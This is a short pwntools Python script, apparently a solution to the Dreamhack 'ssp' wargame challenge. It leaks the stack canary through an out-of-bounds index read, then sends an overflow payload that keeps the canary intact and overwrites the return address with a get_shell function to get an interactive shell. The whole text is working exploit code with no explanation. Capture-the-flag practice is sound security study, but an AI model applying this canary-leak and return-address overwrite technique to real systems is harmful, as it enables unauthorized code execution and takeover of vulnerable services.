from pwn import *
#context.log_level = 'debug'
p=remote('host3.dreamhack.games', 11797)
e=ELF('./ssp')
canary = b""
get_shell = 0x080486cb

for i in range(131,127,-1) :
    p.sendlineafter("> ", 'P')
    p.sendlineafter("Element index : ", str(i))
    p.recvuntil("is : ")
    canary += p.recvn(2)

canary = int(canary, 16)

p.sendlineafter("> ", "E")
p.sendlineafter("Name Size : ", str(80))
payload = b"A"*64 + p32(canary) + b"A"*8 + p32(get_shell)
p.sendlineafter("Name : ", payload)

p.interactive()